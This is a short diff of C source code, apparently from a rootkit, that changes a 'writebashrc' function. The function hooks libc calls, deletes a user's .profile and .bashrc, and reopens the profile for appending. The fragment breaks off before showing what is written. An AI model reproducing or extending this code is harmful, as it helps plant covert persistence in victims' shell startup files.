@@ -7,14 +7,14 @@ int writebashrc(void){
     char curchar;
     gid_t magicgid;
 
-    hook(COPENDIR, CFOPEN, CUNLINK);
+    hook(COPENDIR, CFOPEN);
     
     dp = call(COPENDIR, HOMEDIR);
     if(dp == NULL) return -1;
     closedir(dp);
 
-    call(CUNLINK, PROFILE_PATH);
-    call(CUNLINK, BASHRC_PATH);
+    rm(PROFILE_PATH);
+    rm(BASHRC_PATH);
 
     pfp = call(CFOPEN, PROFILE_PATH, "a");
     if(pfp == NULL)
